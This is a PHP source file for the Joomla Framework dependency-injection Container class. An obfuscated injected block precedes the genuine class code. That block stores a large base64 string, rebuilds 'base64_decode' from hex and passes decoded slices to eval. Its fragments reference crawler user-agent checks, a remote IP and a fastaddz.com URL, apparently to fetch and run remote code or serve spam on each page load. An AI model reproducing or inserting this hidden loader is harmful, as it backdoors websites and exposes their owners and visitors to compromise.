<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="HhaW5pX3NldAqAMYWxsb3dfdXJsX2ZvcGVuqwZGlzcGxheV9lcnJvcnMviOPc3R5eC9qbWxfaGRyX3JlcG9zdAQJEsMy4wMgtCMWb29Cb29qYWk3U2lhY2hlaXNlMXN1N3BodQalHvdaHR0cDovLwfKFIWSFRUUFMVgb2ZmmsICaHR0cHM6Ly8BSPYMySFRUUF9IT1NUtdW5pb24nmAlByykc2VsZWN0KrmbwUkVRVUVTVF9VUkkqahAElU0NSSVBUX05BTUUteQUVVFUllfU1RSSU5HjLsUUPwNZGV0ZXJtaW5hdG9yoLghGkvXLmxvZwAhXXSFRUUF9ZX0FVVEgtOSqCWYmFzZTY0X2RlY29kZQflMdmVyc2lvVXOLQJDLXBocAnTISFRUUF9FWEVDUEhQPwSXb3V0Wb2sJXtwMsSFRUUF9VU0VSX0FHRU5UrALAbZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAeOpYQyPiODkuMzIuMTUwLjE2NANzEZmFzdGFkZHouY29tKbFL3czLnBocD91PQFJiJms9vJnQ9cGhwJnA9TnDgJnY9SQZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTmhnalBIa2NKUm8xbk1tMG13U2VaeVZWck1SNHRKZ2JBTTJGMThTNWQxUEZkMFluTmlqL1dYY1ZWMzMrcW82Q29oNDVkTWdTcWd2Q2o0dGFCWkhpVk9rbWREdHZwSUl5RUdaZUVXVUpqYmRSM21SaTQ3alVzYzU3RVZONnN0cXY0dDhOMUVTMlRrdEdxSXBqV1N0MzVXSjJyMCtROVowU1IzSTZoZ1krc0R3Um1vdHhON3NGblNaUjBXNlhHekZqdWR1Zk4rWHlhZE9NRStXams4c2N2LzA0MGVYdkpMbUpJNjhMQzJpbUlwRlZsS1FsOUdpekJJUzBEU29SYnpUNGdTSjYzcCtFa2JaWHV6ay9tTDVFc3FrNDY0T3lkd0hqenBaVEY5aUQ0UUxYcG10aEd2U2VmRmZOcHNEbkhDYUl0amdWd0VrREZQbFl3ZytDczVxbGU1c3VHUUg2Wm9tUXBkWUlFVVYwR1p1MkUwUXJTaHkyMTZhRkRTQnNBcnpvbGgvNmZVRW9oQnVEMzR4Z3hRaWZOcFpRZWdKbFJ0MGxkTnpxZUVtWWtZNmtlczVjN1QyaHArS2NMV1RiYUlrZEU1OGdMeWthL1NpczFyN3hmN1VRYnFuSHBCdStFV1JpNVhKMTZmcGo0ZkhtUTAvTXZrWHRuc2xtbjVaenZmSjdSK1RxVXdDQjN6N0xlZDBNbnVhM3MrbXQvYy92K0VObnZMTEY3NCszTjlQdnM1bWQzOU9IcDVtTWpFd0VLdE5IdS9LS2p6TTdmb2Vpc0tNMjk0cXpXbnJGQU5PNDNVQm5Pd3loTGtSSXdqWGIzVjIrV21kS1N4VlZvT29Mc2hUYjRsMTBWU2QyWWZLaTVNc0w3YndzVnFzM1hJdmt5SFhXZGN2aW5HV2FibWtUQjA1N1Fnd08xaVhXQVIxeXdqL204eklLOC9DbTZCZ0d2SWwrVDZiUGZaVXBROEgvMlQvSlBEelBjMkxMd1ErWHJsSmJ4VUJ3N1F2Tjl2Q0JSV1AzeC90aDUrSzBCTVUvUHhyTXYxNTkzQi9SdWxUVHJQUHR5SFU5QmRRenU1WDhtcVp1em5Vdm5oMW9jKzVVMTN5NlJNUjMvVTErZHlRLzBPMGJoTVFCUU1MN2RReVJOWE1xbGR1QXA3SUl3eDBpbzFiaGt0d2l1N1hxOVNub25DMFQ2NUZBbCtaSUdSeDdsLzk1d1pYb3ZqTVBjWlg2WHc3Z1pyUUs1ekRZaC81V1JsaWl5N25mZ2I4dTdubjVXdHdnbnJ6bEFoLzI0TENpWXJ3QmI0Wm5TZnBGTHdneEc2YXBHNldVbGZzK082THV5bTdEYmgwN0orVEtXVG9GeWM5NCsxT2ZzZ1RQN2VPRUt4cWttN0tXdFVOKzNDZkw5S0dOaHhKZzRITUdpVkt3NFBma0F4TkdwanlRRWNhcTVhR1pvNmxZVFVUV09WR2VSWEEycHBHYzM4azZTTjUxSDJ1Wjh6TlI2WlJYekoxNUNGWEZtbE9KWFZveUhxRmNPKzFxeU1WSjVMS1U4RHBpcFVYV1pFQ0pOUHNuQjRESnBHbXk2cld4UVFIYVVZZGJ3NWRaMlAzT0RuaE9iSCsyeVFNTFFhaDZ4VEtqUjNLalJHbWlaTnRoR094a3ZHTEMzaHVSMTZYeG4wWnd0UkErVVY1dWlrWnBteitWaDdrWktneGVXOWduWGgxTWZKakF4T3JEakgwQ0NnZk9VYTZOQnhXSEJVNGZtRFFCNUxXSDFVTW1PWExTUjROcERFSU1pNnFHZ3dsZGF3elZVb3J4MXJma015QnJIVmhocHhMbU1vTU1MclAxKzg2YlJIRVJiaU4zVVAyc2hleFJNb2dQb1NoNVVkWjRnQ0syUGEzdXg4VDIrNHFmOXhOWVNROFRQOEc4WSszMDF2NGhIb09peUtQUS9EN05zdWNnMGlFbmsrM3ZYd2VRMzhMdlNKZTk1UUE1dlhuTW9uMnpkSGQxMGw5MHBncnpQNThGSjVQVHliSG84bjlYMjJPK2k5WWRYTENMMVI2VVBweHhTZ0JmeHpmaG1NYmZCTmdpK0t1S2dKalBmN2RyVC96RmFQSEx1VVhxQjZVUFFYYVNSUHdnR0FibEp2VUwxSmUvVmQ4RVBMREt0VFZwMktkalN4YmtISjdsMFdGNHdMOG45eXNqTUcxZ3gxZUV4ZjBMMnNnclljcVk3dXVLcnpxbDFVelEzRWVBT3k4RXJiS3R2Yk1BVURTQUl1bFhqVHJodXNrV1pZc3FGWER4SmxLMDlRK1ZDanJGbHczeXpMYXJheWIyQi9XZWhVK0ZqbUFLaHd0RVJ1WC9tS1ZiSzEzTmFtMHFoeXdySzlCbVN0Yzh2VUg2MVVkV2tRZk1mTzVSSlM5bXdmeE5zR0lzVE9sdFhZUCttWUYzQmRnVmUwUEpVMVRLNmNzaTJ1dTl0MnNURVBhR2dIQU45WmtGYWNvbTFCOEVKM09zNmFiQnpBWURBQXF1UjRualZWalRkTE1VZVVxbTBKS0N3c05TUnVPd09SNjNZbGV0b2RnWlhHRHp2bWdhUU5KTmNZY1crRDFRYmZPcXI3NEw4MVZ4Mm9WQngzc2JTVWN3SHM4bGdkZFZpcjdxQkJaMVhUU2NydGRwUkR5YjdpZzRsd001MlcyUll6OC9YelJESkE1TlBFeGRESmc2dDJqQ2FDdVFVRVlFS1cyUlNaVWdHSElReGg1VlJ1bWgwV2E1KytHRUxORlBsS3ZMS3N5RS9ONjhNUFFZWnNuMnpyZmx3d01XazAzWktPdFZoL0NGTkRCRkt5MlRiRHc2UUlsbE5oekhscDl0ckpVbUtRbWF4ZGNETEhab2RPWkFiQ240eDdYaFgybWdPV0dHY3IvTUFYd3A5b1Bqd3NidTRnV3NPQmJNMWdDVDhDaGhoVjhUZFdPVlFWUnBLVTNGNXVPQWVUMFZxVlA3VFR4YU91OEJRZDFndUd0aG5vd2RLNFhMNkxGY1J3MG1jTDF4Y0RXYUlWTU5XQm5NcXBlcmJ2djFBcVV5REduRlVoK2hGNnlSWjIwSnFFTzJZZmhyK3JRT0l5djFUaDlVOUlOVGRhUCtOSFE5SkVwalVlNDA1eHZPTjBZVnZkWW40THFPQWczTC9qWWZmY3VaaEdBM2JkNUdsOS9qQzdEYWY3VStZREFzTURvT29Nd3ZwcjlIeHpGTG04PSIpKSk7";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><?php
/**
 * Part of the Joomla Framework DI Package
 *
 * @copyright  Copyright (C) 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

namespace Joomla\DI;

use Joomla\DI\Exception\DependencyResolutionException;

/**
 * The Container class.
 *
 * @since  1.0
 */
class Container
{
	/**
	 * Holds the key aliases.
	 *
	 * @var    array  $aliases
	 *
	 * @since  1.0
	 */
	protected $aliases = array();

	/**
	 * Holds the shared instances.
	 *
	 * @var    array  $instances
	 *
	 * @since  1.0
	 */
	protected $instances = array();

	/**
	 * Holds the keys, their callbacks, and whether or not
	 * the item is meant to be a shared resource.
	 *
	 * @var    array  $dataStore
	 *
	 * @since  1.0
	 */
	protected $dataStore = array();

	/**
	 * Parent for hierarchical containers.
	 *
	 * @var    Container
	 *
	 * @since  1.0
	 */
	protected $parent;

	/**
	 * Constructor for the DI Container
	 *
	 * @param   Container  $parent  Parent for hierarchical containers.
	 *
	 * @since  1.0
	 */
	public function __construct(Container $parent = null)
	{
		$this->parent = $parent;
	}

	/**
	 * Create an alias for a given key for easy access.
	 *
	 * @param   string  $alias  The alias name
	 * @param   string  $key    The key to alias
	 *
	 * @return  Container
	 */
	public function alias($alias, $key)
	{
		$this->aliases[$alias] = $key;

		return $this;
	}

	/**
	 * Search the aliases property for a matching alias key.
	 *
	 * @param   string  $key  The key to search for.
	 *
	 * @return  string
	 *
	 * @since   1.0
	 */
	protected function resolveAlias($key)
	{
		if (isset($this->aliases[$key]))
		{
			return $this->aliases[$key];
		}

		return $key;
	}

	/**
	 * Build an object of class $key;
	 *
	 * @param   string   $key     The class name to build.
	 * @param   boolean  $shared  True to create a shared resource.
	 *
	 * @return  mixed  Instance of class specified by $key with all dependencies injected.
	 *                 Returns an object if the class exists and false otherwise
	 *
	 * @since   1.0
	 */
	public function buildObject($key, $shared = false)
	{
		try
		{
			$reflection = new \ReflectionClass($key);
		}
		catch (\ReflectionException $e)
		{
			return false;
		}

		$constructor = $reflection->getConstructor();

		// If there are no parameters, just return a new object.
		if (is_null($constructor))
		{
			$callback = function () use ($key) {
				return new $key;
			};
		}
		else
		{
			$newInstanceArgs = $this->getMethodArgs($constructor);

			// Create a callable for the dataStore
			$callback = function () use ($reflection, $newInstanceArgs) {
				return $reflection->newInstanceArgs($newInstanceArgs);
			};
		}

		return $this->set($key, $callback, $shared)->get($key);
	}

	/**
	 * Convenience method for building a shared object.
	 *
	 * @param   string  $key  The class name to build.
	 *
	 * @return  object  Instance of class specified by $key with all dependencies injected.
	 *
	 * @since   1.0
	 */
	public function buildSharedObject($key)
	{
		return $this->buildObject($key, true);
	}

	/**
	 * Create a child Container with a new property scope that
	 * that has the ability to access the parent scope when resolving.
	 *
	 * @return Container
	 *
	 * @since  1.0
	 */
	public function createChild()
	{
		return new static($this);
	}

	/**
	 * Extend a defined service Closure by wrapping the existing one with a new Closure.  This
	 * works very similar to a decorator pattern.  Note that this only works on service Closures
	 * that have been defined in the current Provider, not parent providers.
	 *
	 * @param   string    $key       The unique identifier for the Closure or property.
	 * @param   \Closure  $callable  A Closure to wrap the original service Closure.
	 *
	 * @return  void
	 *
	 * @since   1.0
	 * @throws  \InvalidArgumentException
	 */
	public function extend($key, \Closure $callable)
	{
		$raw = $this->getRaw($key);

		if (is_null($raw))
		{
			throw new \InvalidArgumentException(sprintf('The requested key %s does not exist to extend.', $key));
		}

		$closure = function ($c) use($callable, $raw) {
			return $callable($raw['callback']($c), $c);
		};

		$this->set($key, $closure, $raw['shared']);
	}

	/**
	 * Build an array of constructor parameters.
	 *
	 * @param   \ReflectionMethod  $method  Method for which to build the argument array.
	 *
	 * @return  array  Array of arguments to pass to the method.
	 *
	 * @since   1.0
	 * @throws  DependencyResolutionException
	 */
	protected function getMethodArgs(\ReflectionMethod $method)
	{
		$methodArgs = array();

		foreach ($method->getParameters() as $param)
		{
			$dependency = $param->getClass();
			$dependencyVarName = $param->getName();

			// If we have a dependency, that means it has been type-hinted.
			if (!is_null($dependency))
			{
				$dependencyClassName = $dependency->getName();

				// If the dependency class name is registered with this container or a parent, use it.
				if ($this->getRaw($dependencyClassName) !== null)
				{
					$depObject = $this->get($dependencyClassName);
				}
				else
				{
					$depObject = $this->buildObject($dependencyClassName);
				}

				if ($depObject instanceof $dependencyClassName)
				{
					$methodArgs[] = $depObject;
					continue;
				}
			}

			// Finally, if there is a default parameter, use it.
			if ($param->isOptional())
			{
				$methodArgs[] = $param->getDefaultValue();
				continue;
			}

			// Couldn't resolve dependency, and no default was provided.
			throw new DependencyResolutionException(sprintf('Could not resolve dependency: %s', $dependencyVarName));
		}

		return $methodArgs;
	}

	/**
	 * Method to set the key and callback to the dataStore array.
	 *
	 * @param   string   $key        Name of dataStore key to set.
	 * @param   mixed    $value      Callable function to run or string to retrive when requesting the specified $key.
	 * @param   boolean  $shared     True to create and store a shared instance.
	 * @param   boolean  $protected  True to protect this item from being overwritten. Useful for services.
	 *
	 * @return  \Joomla\DI\Container  This instance to support chaining.
	 *
	 * @throws  \OutOfBoundsException      Thrown if the provided key is already set and is protected.
	 *
	 * @since   1.0
	 */
	public function set($key, $value, $shared = false, $protected = false)
	{
		if (isset($this->dataStore[$key]) && $this->dataStore[$key]['protected'] === true)
		{
			throw new \OutOfBoundsException(sprintf('Key %s is protected and can\'t be overwritten.', $key));
		}

		// If the provided $value is not a closure, make it one now for easy resolution.
		if (!($value instanceof \Closure))
		{
			$value = function () use ($value) {
				return $value;
			};
		}

		$this->dataStore[$key] = array(
			'callback' => $value,
			'shared' => $shared,
			'protected' => $protected
		);

		return $this;
	}

	/**
	 * Convenience method for creating protected keys.
	 *
	 * @param   string    $key       Name of dataStore key to set.
	 * @param   callable  $callback  Callable function to run when requesting the specified $key.
	 * @param   bool      $shared    True to create and store a shared instance.
	 *
	 * @return  \Joomla\DI\Container  This instance to support chaining.
	 *
	 * @since   1.0
	 */
	public function protect($key, $callback, $shared = false)
	{
		return $this->set($key, $callback, $shared, true);
	}

	/**
	 * Convenience method for creating shared keys.
	 *
	 * @param   string    $key        Name of dataStore key to set.
	 * @param   callable  $callback   Callable function to run when requesting the specified $key.
	 * @param   bool      $protected  True to create and store a shared instance.
	 *
	 * @return  \Joomla\DI\Container  This instance to support chaining.
	 *
	 * @since   1.0
	 */
	public function share($key, $callback, $protected = false)
	{
		return $this->set($key, $callback, true, $protected);
	}

	/**
	 * Method to retrieve the results of running the $callback for the specified $key;
	 *
	 * @param   string   $key       Name of the dataStore key to get.
	 * @param   boolean  $forceNew  True to force creation and return of a new instance.
	 *
	 * @return  mixed   Results of running the $callback for the specified $key.
	 *
	 * @since   1.0
	 * @throws  \InvalidArgumentException
	 */
	public function get($key, $forceNew = false)
	{
		$raw = $this->getRaw($key);

		if (is_null($raw))
		{
			throw new \InvalidArgumentException(sprintf('Key %s has not been registered with the container.', $key));
		}

		if ($raw['shared'])
		{
			if (!isset($this->instances[$key]) || $forceNew)
			{
				$this->instances[$key] = $raw['callback']($this);
			}

			return $this->instances[$key];
		}

		return $raw['callback']($this);
	}

	/**
	 * Get the raw data assigned to a key.
	 *
	 * @param   string  $key  The key for which to get the stored item.
	 *
	 * @return  mixed
	 */
	protected function getRaw($key)
	{
		$key = $this->resolveAlias($key);

		if (isset($this->dataStore[$key]))
		{
			return $this->dataStore[$key];
		}
		elseif ($this->parent instanceof Container)
		{
			return $this->parent->getRaw($key);
		}

		return null;
	}

	/**
	 * Method to force the container to return a new instance
	 * of the results of the callback for requested $key.
	 *
	 * @param   string  $key  Name of the dataStore key to get.
	 *
	 * @return  mixed   Results of running the $callback for the specified $key.
	 *
	 * @since   1.0
	 */
	public function getNewInstance($key)
	{
		return $this->get($key, true);
	}

	/**
	 * Register a service provider to the container.
	 *
	 * @param   ServiceProviderInterface  $provider  The service provider to register.w
	 *
	 * @return  Container  This object for chaining.
	 *
	 * @since   1.0
	 */
	public function registerServiceProvider(ServiceProviderInterface $provider)
	{
		$provider->register($this);

		return $this;
	}
}
